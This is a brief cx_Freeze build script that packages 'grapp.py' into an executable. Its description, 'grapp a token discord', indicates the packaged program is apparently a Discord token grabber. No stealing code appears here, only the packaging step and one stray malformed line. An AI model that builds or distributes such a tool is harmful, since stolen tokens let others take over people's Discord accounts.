from cx_Freeze import setup, Executable
base = None
executablesreatch = [Executable("")]
executables = [Executable("grapp.py", base=base)]
packages = ["idna", "os", "re", "json"]
options = {
    'build_exe': {    
        'packages':packages,
    },
}
setup(
    name = "grapp",
    options = options,
    version = "1.0",
    description = 'grapp a token discord',
    executables = executables, 
)
